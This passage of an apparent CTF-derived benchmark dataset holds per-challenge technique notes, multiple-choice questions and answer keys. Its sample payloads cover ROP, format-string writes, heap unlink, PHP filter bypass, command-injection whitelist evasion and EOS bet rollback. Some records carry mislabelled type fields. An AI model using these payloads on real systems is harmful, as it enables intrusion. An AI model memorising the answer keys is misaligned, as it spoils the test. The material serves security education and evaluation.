            "In challenges involving pseudo-random number generation mechanisms, especially in blockchain contracts, it's possible to exploit predictable random number generation algorithms by decompiling the contract, understanding the algorithm, and predicting the outcome. Deploying your custom contract that can predict these numbers allows for manipulating the contract's actions. This technique requires understanding the blockchain's transaction model, decompilation skills for smart contracts, and the ability to write and deploy a contract that exploits the target contract's vulnerabilities.  \n**Sample payload**:  \n```\ncleos set account permission [your_account] active '{\"threshold\": 1,\"keys\": [{\"key\": \"[your_key]\",\"weight\": 1}],\"accounts\":[{\"permission\":{\"actor\":\"[your_account]\",\"permission\":\"eosio.code\"},\"weight\":1}]}'\ncleos set contract [your_account] . -p [your_account]@active  \ncleos push action [your_account] makebet '[]' -p [your_account]@active  \n```"
        ],
        "question": [
            "In an EOS blockchain scenario where a betting game requires a user not to lose or they would be unable to continue, which technique can be utilized to ensure multiple attempts without consequence? - A. Utilize external oracles for accurate predictions - B. Deploy a smart contract that exploits transaction atomicity to roll back losses - C. Increase the gas price to prioritize transactions - D. Encrypt transaction data to prevent detection of the betting strategy",
            "When facing a blockchain challenge where the contract uses a pseudo-random number for operations, such as a betting game, what strategy can be employed to increase the chances of winning? - A. Implement a higher gas fee to speed up transaction confirmation - B. Utilize quantum computing to break the random number generator - C. Deploy a contract that can predict and exploit the pseudo-random number generation - D. Hack into the blockchain network to alter transaction data"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "easy math 1",
        "write_up": "dataset/raw/easy math 1.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For challenges that involve solving a high volume of automated tasks or dynamic input/output operations within a shell or programmatic session, the Python `pexpect` library can be utilized effectively to automate the sending and receiving of data. This approach is particularly useful in scenarios where direct interaction with a server or service, such as SSH, is required to solve the problem. Through the use of `spawn()`, `expect()`, and `sendline()` functions, `pexpect` allows for the automation of interactions that would otherwise require manual input and output monitoring. An example snippet for using `pexpect` to automate the solving of math problems via SSH could look like this:\n\n```python\nimport pexpect\n\nchild = pexpect.spawn('ssh ctf@easy-math.chal.uiuc.tf')\nchild.expect('ctf@easy-math.chal.uiuc.tf\\'s password:')\nchild.sendline('ctf')\n# Further commands to interact with the challenge.\n```",
            "When faced with the task of programmatically solving questions or executing commands where the output of each command determines the input of the subsequent command, consider dynamically parsing command output and computing responses on-the-fly. This strategy ensures efficiency and scalability in solving challenges which require a large number of sequential and dependent steps. The core concept involves capturing command output, processing it to determine the correct response, and then supplying that response as input for the next challenge step. This approach can be generalized and applied to a wide range of CTF challenges, especially those requiring interaction with a shell or custom protocols. A pseudocode example for dynamically solving math problems based on captured output could look as follows:\n\n```python\n# Assuming 'child' is a pexpect.spawn object connected to the challenge\nfor question in range(10000):\n    child.expect('Question \\d+: (\\d+) \\* (\\d+) =')\n    a, b = map(int, child.match.groups())\n    answer = a * b\n    child.sendline(str(answer))\n# Proceed to capture the flag or next set of instructions.\n```"
        ],
        "question": [
            "When writing a Python script to automate SSH login and interaction for solving a task requiring input/output manipulation, which command from the `pexpect` library initializes the SSH session?  - A. `child = pexpect.spawn('ssh user@hostname')` - B. `child = pexpect.begin('ssh user@hostname')` - C. `child = pexpect.execute('ssh user@hostname')` - D. `child = pexpect.run('ssh user@hostname')` ",
            "In a challenge where the output of a command contains dynamic values that determine the input for subsequent commands, what is an efficient method to automate the process of reading command output, computing the necessary response, and supplying it as input for the next step?  - A. Write a script that manually enters each response after human calculation. - B. Use a static mapping of possible questions to answers, anticipating all potential outputs. - C. Utilize regular expressions to parse output in real-time, then calculate and send responses within a loop. - D. Only focus on the first few outputs manually then guess the pattern for the remaining ones without parsing. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Easy NFT",
        "write_up": "dataset/raw/Easy NFT.md",
        "type": "The challenge described in the write-up is of the **forensics** type.",
        "competition": [
            "Dragon/2021",
            "https://ctftime.org/event/1457/tasks/"
        ],
        "score": 354,
        "max_score": 471,
        "difficulty": 0.7515923566878981,
        "knowledge": [
            "When encountering pcap files that involve netlink messages, parsing can be effectively handled using the combination of `tshark` for initial extraction and Go programming language with libraries such as `github.com/mdlayher/netlink` for decoding the messages. This approach is useful for extracting structured data from pcap files for analysis. The first step involves using `tshark` to convert the pcap to a hexadecimal dump, followed by a Go program to parse these hex dumps into human-readable netlink messages. This method is applicable in scenarios involving network diagnostics, forensics, or reverse engineering where netlink communication is present.\n   \n   Sample command to extract hex dumps with `tshark`: \n   ```\n   tshark -r input.pcap -x | grep -v \"0000\" | awk -F \"  \" '{print $2}' | tr -d ' ' | perl -00 -lpe 'tr/\\n//d' | grep -Ev '^\\s*' > output_netlink.dump\n   ```",
            "For challenges that involve analyzing netfilter (nftables) netlink messages, identifying message and attribute types is crucial for understanding the captured data's semantics. This can be accomplished by mapping the types to their corresponding names, based on the Linux kernel's netfilter and nftables documentation or source code. This technique allows for a deeper analysis of firewall configurations, rulesets, or other netfilter-related settings captured in pcap files. This knowledge is particularly useful when dealing with network security analysis or diagnostics challenges where understanding the behavior of netfilter rules is critical.\n\n   Example to map message type to its name in Go:\n   ```go\n   var messageTypeNames = []string{\"NFT_MSG_NEWTABLE\", \"NFT_MSG_GETTABLE\", ...};\n\n   // Usage in code to print friendly names\n   fmt.Printf(\"%s\\n\", messageTypeNames[header.MessageType])\n   ```"
        ],
        "question": [
            "In an investigation involving corrupted or suspicious netlink communications captured in a pcap file, what approach can be adopted for analyzing the data to extract meaningful information using Go? - A. Run a full textual search on the pcap file to find human-readable strings directly without needing hexadecimal conversion. - B. Utilize a Python script to parse the pcap file directly and apply regular expressions to find patterns of interest within the data, assuming netlink messages can be easily read. - C. Employ `tshark` to export the hexadecimal representation of the packets from the pcap file and then use Go with the `github.com/mdlayher/netlink` library to decode these hex dumps into structured netlink messages. - D. Directly use the `netstat` or `ss` commands to interpret the pcap file, assuming they can read and parse pcap files to provide current netlink socket information. ",
            "When analyzing netfilter (nftables) rules and configurations from pcap files containing netlink messages, which method is accurate for translating message and attribute types into human-readable form to understand their behavior? - A. Utilize the `ip` command to interpret netlink types, assuming it provides mappings for all netlink and netfilter message types directly from pcap files. - B. Apply a generic text parsing library on the raw data without considering the specific netlink or netfilter structure, assuming all needed information is in text format. - C. Refer to mappings defined based on the Linux kernel's netfilter and nftables documentation or source codes in a Go program to translate message and attribute types to their names. - D. Use network monitoring tools such as `nmap` to reverse-engineer message types from the pcap, assuming it can interpret netlink message types and their meanings. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Easy Peasy",
        "write_up": "dataset/raw/Easy Peasy.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2023",
            "https://ctftime.org/event/2042/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In challenges dealing with buffer overflow vulnerabilities, especially with binaries compiled for the AMD64 architecture, identifying the offset necessary to overwrite the return address is crucial. This can be done using tools like `cyclic` in GDB-enhanced with `pwndbg`. This step is pivotal before constructing the payload for a `ret2win` scenario. For instance, after crashing the program with a cyclic pattern, use `cyclic -l` with the address the program crashed on to find the offset. In this context, the offset was found at 40 bytes.",
            "When dealing with Return Oriented Programming (ROP) in binaries where NX bit is disabled, and there's no PIE, it's useful to first look for a `ret` gadget and then chain it with the functions necessary to exploit the binary, specifically leading to the `win` function to execute arbitrary code. This approach helps bypass potential stack alignment issues that might prevent the exploit from working as intended. An additional step to ensure reliability, especially in remote exploitation scenarios, might involve calling another function (like `main`) after the `win` function to stabilize control flow and ensure the flag is printed out. Example payload template: `b\"A\"*<offset> + p64(<ret_gadget>) + p64(<win_function>) + p64(<optional_continuation>)`.\n\nSample exploit segment:\n```python\n# Assuming offset is 40, elf is the ELF binary loaded with pwntools, and ret is found with `asm('ret')`\npayload = b\"A\"*40 + p64(ret) + p64(elf.sym.win) + p64(elf.sym.main)\n```"
        ],
        "question": [
            "In the context of exploiting a buffer overflow vulnerability within an AMD64-architecture binary, where using cyclic patterns to identify payload offsets plays a critical role, which of the following commands accurately describes how to determine the offset necessary for overwriting the return address after causing the program to crash with a pattern?  - A. Use `cyclic -l` with the base address of the binary to determine the offset. - B. Use `cyclic` alone to automatically overwrite the return address. - C. Use `cyclic -l` followed by the address the program crashed on to find the offset. - D. Use `objdump -D` on the binary and count the bytes manually to find the offset. ",
            "In a situation where executing a return-oriented programming (ROP) payload in a binary with NX disabled and no PIE, which involves chaining multiple gadgets and functions together, what is the correct order of elements in a payload designed to exploit a ret2win scenario, specifically when aiming to ensure the robust execution of the win function in a remote exploitation context?  - A. `b\"A\"*<offset> + p64(<win_function>) + p64(<main_function>) + p64(<ret_gadget>)` - B. `b\"A\"*<offset> + p64(<ret_gadget>) + p64(<win_function>) + p64(<optional_continuation>)` - C. `b\"A\"*<offset> + p64(<win_function>) + p64(<ret_gadget>)` - D. `b\"A\"*<offset> + p64(<main_function>) + p64(<ret_gadget>) + p64(<win_function>)` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "easy pseudo random",
        "write_up": "dataset/raw/easy pseudo random.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2021",
            "https://ctftime.org/event/1256/tasks/"
        ],
        "score": 167,
        "max_score": 392,
        "difficulty": 0.4260204081632653,
        "knowledge": [
            "To break a Blum Blum Shub-like pseudorandom number generator (PRNG) where partial information about the first two outputs is known, one can utilize the LLL algorithm for lattice basis reduction. This approach is effective when manipulating the equation to isolate unknown parts and form a lattice that enables solving for these unknown parts. Such manipulation includes forming a matrix that represents the problem and adjusting its scale to conform to conditions like Minkowski's Bound. This technique works under the condition that enough information is provided to form a solvable lattice, and it's applicable in scenarios where compromising PRNGs is necessary to decrypt information.\n   \n   Example step: Adjusting the scale involves setting variables \\(A = \\frac{p}{X}\\), \\(B = p\\), and \\(C = \\frac{p}{X^2}\\) in the matrix that defines the lattice, ensuring the determinant and norm satisfy specific bounds for the LLL algorithm to effectively find a solution.",
            "After successfully compromising the PRNG and determining the missing parts of its initial outputs, it's straightforward to sequentially generate the subsequent outputs. These outputs can then be used to decrypt messages that were encrypted by XOR-ing them with the PRNG outputs. This decryption approach is particularly relevant when dealing with cryptographic challenges where a secret message, such as a flag, is encrypted in this manner. The knowledge applies directly to scenarios where the attacker has partial knowledge of the initial PRNG state and aims to fully reconstruct it to decrypt the hidden message.\n\n   Example payload (concept): Given the recovered initial states `x0` and `x1`, it's possible to perform the decryption by reversing the XOR operation: `decrypted_message = encrypted_message ^^ int(v)`, where `v` is iteratively updated using the PRNG update function `F(v) = v^2 + b` over `\\(\\mathbb{Z}/p\\mathbb{Z}\\)`."
        ],
        "question": [
            "In the context of attacking a variant of the Blum Blum Shub pseudorandom number generator, where only parts of the initial outputs are known, which method is utilized for manipulating and solving the equation to isolate unknown parts effectively? - A. Using a simple substitution cipher to decrypt the outputs directly. - B. Employing the Fast Fourier Transform to analyze the frequency components of the outputs. - C. Applying the LLL algorithm for lattice basis reduction to form a solvable lattice. - D. Implementing RSA decryption to reverse-engineer the PRNG's initial state.",
            "When decrypting messages that were encrypted by XOR-ing them with the outputs of a compromised PRNG, which step correctly describes the process of decryption using the subsequent PRNG outputs after successfully compromising the PRNG? - A. Utilizing a Caesar cipher shift based on the PRNG's seed value to decrypt the message. - B. Applying modular arithmetic operations on the PRNG outputs to revert the encryption. - C. Reversing the XOR operation with the recovered PRNG outputs to decrypt the message. - D. Conducting a man-in-the-middle attack to intercept and decode the encrypted messages."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Easy RSA 1",
        "write_up": "dataset/raw/Easy RSA 1.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When the RSA challenge provides an unusually large public exponent (`e`) that is almost as large as the modulus (`n`), the Boneh-Durfee attack can be effective in recovering the private key `d`. The condition here is that `e` is significantly larger than typical values (e.g., 1023 bits for `e` vs. 1024 bits for `n`).",
            "Efficient implementations of advanced attacks, such as the Boneh-Durfee attack, are available and can sometimes allow for the recovery of private keys in less than a second when certain conditions are met. Tools or scripts that implement these cryptographic attacks can significantly ease the process of breaking RSA when its parameters meet specific criteria. \n\nSample payload for RSA decryption after obtaining `d` (not specific to Boneh-Durfee): \n\n```python\n# Assuming RSA parameters `n`, `e`, and `c` are given, and `d` has been found.\ndef decrypt_rsa(c, d, n):\n    return pow(c, d, n)\n\n# Decrypt the ciphertext `c` using the private key `d` and modulus `n` to get the plaintext\nplaintext = decrypt_rsa(ciphertext, d, n)\nprint(\"Decrypted message:\", plaintext)\n```"
        ],
        "question": [
            "In the context of RSA encryption, why would an unusually large public exponent (`e`) similar in size to the modulus (`n`) be particularly noteworthy for an attack? - A. It indicates a stronger encryption method that is almost impossible to break. - B. It creates a scenario where the Boneh-Durfee attack can be effectively applied to recover the private key `d`. - C. It suggests that traditional methods like brute force become more efficient. - D. It ensures that the encryption process is faster than with smaller values of `e`.",
            "When given RSA parameters lead to the possibility of applying advanced attacks for private key recovery, what is a crucial factor in the success of such attacks? - A. The need for extensive manual analysis to understand the encryption algorithm. - B. The usage of simple, commonly available scripts for the RSA encryption process. - C. Availability and efficiency of implementation scripts for the specific cryptographic attack, enabling recovery of private keys in a short time. - D. The requirement for a powerful quantum computer to analyze the RSA parameters."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Easy RSA 2",
        "write_up": "dataset/raw/Easy RSA 2.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 919,
        "max_score": 1000,
        "difficulty": 0.919,
        "knowledge": [
            "When cracking multi-prime RSA where primes are very close to each other, Fermat's factorization method is very effective. This method particularly applies when the modulus `n`'s prime factors have a small difference, which makes `n` susceptible to being factored if `c` (the difference between the product of pairs of primes) is less than `{4 * N}^{1 / 4}` from `sqrt(N)`. This technique can be applied to recover all prime factors by calculating the greatest common divisor (GCD) of combinations of these factors.",
            "After obtaining the prime factors in a multi-prime RSA scenario, computing the Carmichael's totient function (or Euler's totient function in the case of RSA) allows for the RSA private exponent `d` to be computed by finding the modular inverse of `e` modulo `\\phi(n)`. Once `d` is known, the encrypted message can be decrypted to reveal the flag. While the Euler's totient function `\\phi(n)` is typically used for RSA with two primes, Carmichael's function can provide the correct totient value for RSA schemes involving more than two prime numbers, ensuring the private key generated is valid for decryption."
        ],
        "question": [
            "In the context of factorizing an RSA modulus `n` that has been formed from primes very close to each other, which method can be effectively used based on the vulnerability that the difference `c` between the product pairs of primes is significantly small? - A. Using the quadratic sieve method - B. Applying Fermat's factorization method - C. Utilizing the general number field sieve - D. Employing Pollard's rho algorithm",
            "After factoring the RSA modulus `n` in a challenge involving multi-prime RSA, which function is appropriate for computing the totient needed to derive the private exponent `d`? - A. Euler's totient function `\\phi(n)` when `n` is the product of two primes - B. Carmichael's totient function for any RSA scheme - C. Carmichael's totient function specifically for RSA schemes involving more than two prime numbers - D. Euler's totient function without consideration of the number of primes"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Easy RSA",
        "write_up": "dataset/raw/Easy RSA.md",
        "type": "crypto",
        "competition": [
            "BCACTF/2021",
            "https://ctftime.org/event/1369/tasks/"
        ],
        "score": 50,
        "max_score": 450,
        "difficulty": 0.1111111111111111,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is a product of two primes \\(p\\) and \\(q\\), the decryption key \\(d\\) can be found by computing the modular inverse of \\(e\\) with respect to \\(\\phi(n) = (p - 1)(q - 1)\\). This method is applicable once the prime factors (\\(p\\) and \\(q\\)) and the public exponent (\\(e\\)) are known. This approach allows for the decryption of the ciphertext (\\(ct\\)) to get the plaintext.\n    - Example code segment for computing \\(d\\) and decrypting could look like the following:\n    ```python\n    p = int(input('p: ').strip())\n    q = int(input('q: ').strip())\n    e = int(input('e: ').strip())\n    ct = int(input('ct (as hex): ').strip(), 16)\n    \n    phi = (p - 1) * (q - 1)\n    d = getModInverse(e, phi)\n    \n    pt = pow(ct, d, p*q)  # p*q is n\n    ```",
            "In scenarios where the ciphertext (\\(ct\\)) and the encryption exponent (\\(e\\)) are relatively small compared to the modulus \\(n\\), it may be possible to decrypt \\(ct\\) simply by calculating the \\(e\\)th root of \\(ct\\) without performing modulo \\(n\\) operations. This approach is particularly feasible in situations where \\(ct^e < n\\), which could lead to a vulnerable implementation of RSA where the plaintext can be recovered directly.\n    - Example Python code for computing the plaintext from \\(ct\\) using the `gmpy2.iroot()` function would be:\n    ```python\n    import gmpy2\n    from Crypto.Util.number import long_to_bytes\n    \n    ct = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941\n    e = 3\n    \n    pt = gmpy2.iroot(ct, e)[0]\n    print(\"Flag is:\", long_to_bytes(pt).decode())\n    ```"
        ],
        "question": [
            "In the context of RSA encryption, when given prime numbers \\(p\\) and \\(q\\), along with the public exponent \\(e\\), which method is used to derive the private decryption key \\(d\\)? - A. d = e * (p + q) - B. d = e / (p + q) - C. d = getModInverse(e, (p - 1) * (q - 1)) - D. d = (p - 1) * (q - 1) / e",
            "Given a small encryption exponent \\(e\\) and a ciphertext \\(ct\\) that is relatively small compared to the modulus \\(n\\), which Python function is suitable for computing the plaintext without needing to perform modulo \\(n\\) operations? - A. pow(ct, 1/e, n) - B. gmpy2.iroot(ct, e)[0] - C. math.sqrt(ct ** e) - D. ct ** (1/e)"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "easyphp",
        "write_up": "dataset/raw/easyphp.md",
        "type": "pwn",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": -1,
        "max_score": 846,
        "difficulty": -1,
        "knowledge": [
            "When encountering PHP challenges where direct invocation of system-level functions like `system`, `exec`, or `shell_exec` is disabled, it can be beneficial to leverage PHP's ability to execute code via `eval()` and use functions that are not typically disabled to interact with the system. This can include using `phpinfo()` to enumerate the PHP environment, `scandir()` to list directory contents, and file inclusion functions like `highlight_file()` or `file_get_contents()` to read file contents. This approach allows for indirect interaction with the system and can reveal sensitive information or files.\n   - Example payload for reading a file when direct execution functions are disabled: `highlight_file('path/to/secret_file.txt');`",
            "PHP's type juggling and operator behavior can be exploited to bypass character and function name restrictions imposed by input validation routines. In cases where a challenge applies filters or restrictions on the input (e.g., disallowing certain characters or strings), using bitwise operations like XOR (`^`) on permitted characters or leveraging PHP's interpretation of unquoted strings can enable constructing payloads that dynamically generate restricted characters or strings. This is especially useful when needing to invoke functions or access variables that would otherwise be blocked by the input validation.\n   - Example payload to craft restricted strings through type juggling and bitwise operations: `@(AD^\"12\").@(BB^\"23\").@(CC^\"34\")();` This pattern can be adapted to generate different characters based on ASCII values manipulated through XOR."
        ],
        "question": [
            "When system-level function calls are disabled in PHP, which of the following functions could be used to gather information about the PHP environment and potentially assist in further exploitation of the application? - A. `exec('/bin/bash')` - B. `phpinfo()` - C. `eval(base64_decode($_GET['code']))` - D. `system('ls')` ",
            "How can PHP's type juggling and operator behavior be exploited to bypass input validation that restricts using certain characters or direct function name calls? - A. By using the `include()` function to dynamically execute code from another file - B. By leveraging SQL Injection to bypass PHP restrictions - C. By creating a custom PHP extension that ignores input validation - D. By applying a bitwise XOR operation on strings to generate restricted characters or access blocked functions "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "ec3",
        "write_up": "dataset/raw/ec3.md",
        "type": "misc",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 149,
        "max_score": 500,
        "difficulty": 0.298,
        "knowledge": [
            "When dealing with custom qemu binary challenges that involve extra PCI devices, analyzing the binary for strings related to class initialization functions (e.g., \"ooo_class_init\") can help identify custom drivers or additional functionality not present in standard qemu binaries. This approach aids in understanding the custom implementation and could lead to discovering vulnerabilities stemming from these custom additions. Understanding the standard process of how devices are added to qemu, by looking at source code or documentation online, can significantly accelerate the reverse-engineering process. \n\nExample approach: Strings search in binary for device-related functions, followed by comparing with standard qemu device addition methods found in sources like the official qemu GitHub repository.",
            "For exploiting heap vulnerabilities in a scenario where a custom device allows for arbitrary read and writes without bounds checking, one effective strategy is to target the array holding `malloc`ed pointers in the bss segment by performing a precise heap exploitation. This can be achieved by corrupting chunk headers using the allocation functions provided by the vulnerable driver and leveraging the unlink macro during `free` operation to gain arbitrary write capabilities. Specifically, carefully forging a chunk and manipulating its headers (such as `prev_size` and `prev_inuse` flag) can allow an attacker to overwrite pointers in the bss segment, thus gaining control over where to read and write when accessing the driver's memory. The final step in the exploit can involve overwriting critical function pointers such as the Global Offset Table (GOT) entries to redirect execution flow, for instance, to a function that prints the flag.\n\nExample payload snippet:  \n```c  \n// Forging fake chunk and manipulating headers  \nwrite_heap(map_base, 0, 0x80, 0x80); // chunk2 prev_size  \nwrite_heap(map_base, 0, 0x94, 0x88); // unset PREV_INUSE bit for chunk2  \n// Overwrite pointer  \nwrite_heap(map_base, 0, pointer_address, offset);  \n// Redirect execution  \nwrite_heap(map_base, 1, function_to_redirect_to, 0);  \n```\nThis exploit technique demonstrates the application of heap exploitation principles to overwrite sensitive memory locations and achieve arbitrary code execution in the context of CTF challenges involving custom qemu devices with heap vulnerabilities."
        ],
        "question": [
            "When trying to understand a custom qemu binary's implementation that mentions \"extra PCI devices,\" which technique is beneficial for discovering the additional functionality or drivers implemented? - A. Decompiling the entire binary to source code and analyzing each function line by line. - B. Sending random data to all available devices and monitoring the binary's behavior. - C. Looking for strings within the binary that reference device initialization functions, such as \"ooo_class_init\", and comparing them with standard qemu device addition methods. - D. Analyzing the binary in a hex editor to identify sections that are larger than those found in official qemu binaries. ",
            "In exploiting heap vulnerabilities, especially when there's a driver that allows for unbounded read and write operations, how can arbitrary write capabilities be achieved to target `malloc`ed pointers in the bss segment? - A. By creating numerous threads to cause a race condition that corrupts the memory allocator's metadata. - B. Utilizing the driver's write function on an arbitrary address without setting up any prior heap manipulation. - C. Overwriting the heap metadata directly using the driver's read function to cause a buffer overflow on the heap. - D. Forging a chunk and manipulating its headers (such as `prev_size` and `prev_inuse` flag) during a `free` operation to overwrite pointers in the bss segment, thus gaining arbitrary write capabilities. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Ecchimera",
        "write_up": "dataset/raw/Ecchimera.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 271,
        "max_score": 477,
        "difficulty": 0.5681341719077568,
        "knowledge": [
            "When facing an Elliptic Curve Discrete Logarithm Problem (ECDLP) on a curve defined over a composite field \\(Z_n\\) (where \\(n\\) is not prime), if \\(n\\) can be factored into primes \\(p\\) and \\(q\\), split the problem into subproblems over \\(F_p\\) and \\(F_q\\). For each subproblem, solve the discrete log problem in \\(F_p\\) and \\(F_q\\) independently. This can significantly simplify solving ECDLPs in non-prime fields.\n   - Example approach: Factor \\(n\\) using services like http://factordb.com/, then define curves over \\(GF(p)\\) and \\(GF(q)\\) to find discrete logs separately.",
            "Apply specific cryptographic attacks based on the properties of the curve orders over \\(F_p\\) and \\(F_q\\). If the order of the curve over \\(F_p\\) equals \\(p\\), indicating an anomalous curve, Smart's attack could be applied to solve the discrete logarithm efficiently. Whereas, for a curve over \\(F_q\\) with a smooth order, the Pohlig-Hellman algorithm is suitable, especially when the factors of the order are small primes, allowing for the discrete log problem to be broken into easier subproblems.\n   - Example payload for Smart's attack or Pohlig-Hellman algorithm could not be provided due to complexity but would involve implementing the respective attacks in a programming environment such as SageMath, catering to the curve and order's specific characteristics."
        ],
        "question": [
            "When working with an Elliptic Curve Discrete Logarithm Problem over a composite field \\(Z_n\\), which of the following steps is essential after factoring \\(n\\) into its prime components \\(p\\) and \\(q\\)? - A. Solve the ECDLP directly over \\(Z_n\\) without further adjustments. - B. Split the ECDLP into separate problems over fields defined by \\(p\\) and \\(q\\), then solve for discrete logs over \\(GF(p)\\) and \\(GF(q)\\) independently. - C. Convert the elliptic curve into a hyperbolic curve and solve over \\(Z_n\\). - D. Apply the same cryptographic attack across both \\(F_p\\) and \\(F_q\\) without considering the properties of their orders. ",
            "Given an elliptic curve over \\(Z_n\\) that factors into \\(p\\) and \\(q\\), where the order of the curve over \\(F_p\\) equals \\(p\\) (indicating an anomalous curve), and the order over \\(F_q\\) is smooth (suited for Pohlig-Hellman), which attacks are most suitable for efficiently solving the discrete logarithm problem respectively? - A. Apply Smart's attack on the curve over \\(F_p\\) and brute force over \\(F_q\\). - B. Apply Pohlig-Hellman on the curve over \\(F_p\\) and brute force over \\(F_q\\). - C. Apply Smart's attack on the curve over \\(F_p\\) and Pohlig-Hellman on the curve over \\(F_q\\), based on their respective properties. - D. Use the Chinese Remainder Theorem on both curves without applying specific attacks. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Echo Server",
        "write_up": "dataset/raw/Echo Server.md",
        "type": "reverse",
        "competition": [
            "BSidesAhmedabad/2020",
            "https://ctftime.org/event/1065/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When dealing with format string vulnerabilities in an environment where specific sequences (like `%n`) are filtered or removed, one can use the format string parameter field to bypass the filter. By adjusting the parameter number, it is possible to indirectly utilize restricted sequences for arbitrary memory write operations. For example, if `%n` is filtered, you can use `%x$n` to perform writes or leak memory addresses, where `x` corresponds to the parameter number on the stack.",
            "In scenarios where buffer space is limited, and direct shellcode injection seems infeasible due to size constraints, altering control flow data (such as return addresses) or manipulating the program's execution state indirectly via format strings can provide a way to execute larger payloads or create a more favorable execution environment. This might involve techniques such as expanding the buffer beyond its initial limit by writing to specific memory locations, or leveraging functions like `mprotect` to make non-executable regions executable, thereby bypassing NX protections. For instance, to expand the buffer, one could write to a stack location (like `stack + 1053`) to artificially increase the number of bytes that can be read and processed.\n   \n   Example Python snippet to write to an arbitrary memory location leveraging the format string vulnerability:\n   ```python\n   def write(loc, what):\n       while what > 0:\n           next_byte = what & 0xff\n           if next_byte < 4:\n               send(b\"A\" * next_byte + b\"%7$n\" + b\"A\" * (4 - next_byte) + p32(loc) + b\"\\n\")\n           else:\n               send(p32(loc) + b\"A\" * (next_byte - 4) + b\"%5$n\\n\")\n           loc += 1\n           what >>= 8\n   ```"
        ],
        "question": [
            "When attempting to leverage a format string vulnerability in an environment where '%n' is explicitly filtered out, which of the following format string adjustments is a correct method to bypass such a filter and continue with arbitrary memory operations?  - A. Use `%s` directly instead of `%n` to write bytes. - B. Utilize the format string parameter field with `%x$n` where `x` is the parameter number on the stack. - C. Increase the number of `%x` before `%n` to bypass the filter. - D. Replace `%n` with `%x` without specifying any parameter number. ",
            "Given a scenario where direct shellcode injection is limited by a small buffer size, and the binary is compiled with NX (Non-Executable stack) protection, which approach is correct for executing larger payloads or creating a more favorable execution environment?  - A. Directly inject the shellcode into the stack and execute it without any adjustments. - B. Use the `strcpy` function to bypass NX protections. - C. Write to specific memory locations (e.g., `stack + 1053`) to expand the buffer and use `mprotect` to make non-executable regions executable. - D. Modify the permissions of the stack directly to make the shellcode executable without using any additional functions. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "echoechoechoecho",
        "write_up": "dataset/raw/echoechoechoecho.md",
        "type": "The type of this challenge is **pwn** (short for \"exploit\").",
        "competition": [
            "insomnihack/2019/Quals",
            "https://ctftime.org/event/686/tasks/"
        ],
        "score": 216,
        "max_score": 500,
        "difficulty": 0.432,
        "knowledge": [
            "When faced with a strict whitelist of allowed characters in command injection challenges, use creative methods to bypass character restrictions. This can include redefining allowed characters as variables and using them to concatenate or multiply to form restricted characters, or utilizing built-in shell features like ANSI-C quoting for encoding arbitrary commands. For instance, to encode restricted characters like `(`, one could use `echo=\\(; echo $echo$echo$echo$echo` to output four left brackets, exploiting the whitelisted `echo` command and assignment operation.",
            "For encoding digits which are not directly allowed by the character whitelist, leverage shell arithmetic or other shell functionalities to generate them. An example given in the writeup is using `$(($$==$$))` to represent the digit `1` and adding up these ones to form any required digit. This technique is essential for bypassing filters that restrict direct use of numeric characters but allow arithmetic or variable expansion operations."
        ],
        "question": [
            "In a command injection challenge, when faced with a whitelist that restricts the use of numeric characters, which bash feature allows for the generation of digits implicitly? - A. Utilizing wildcard expansions to infer numbers - B. Leveraging arithmetic operations such as `$(($$==$$))` to generate the digit `1` - C. Using the `echo` command to print numeric characters directly - D. Applying ANSI-C quoting for numeric character encoding",
            "To bypass a character whitelist in a bash environment that includes a severe restriction on special characters, yet allows the use of `echo`, variables, and pipes, which method could be utilized to encode and execute commands that require restricted characters like the left parenthesis `(`? - A. Direct execution of restricted commands using binary representation - B. Encoding arbitrary commands using base64 and then decoding them - C. Redefining restricted characters as variables and concatenating them, for example, `echo=\\(; echo $echo$echo$echo$echo` to produce multiple left brackets - D. Employing URL encoding to bypass character restrictions"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Educated Assumption",
        "write_up": "dataset/raw/Educated Assumption.md",
        "type": "This challenge is a cloud forensics challenge, which involves analyzing and retrieving information from cloud services such as AWS Secret Manager and IAM roles to ultimately access and read a flag stored within a secure setup.",
        "competition": [
            "nullconHackIM/2023-Goa",
            "https://ctftime.org/event/2065/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
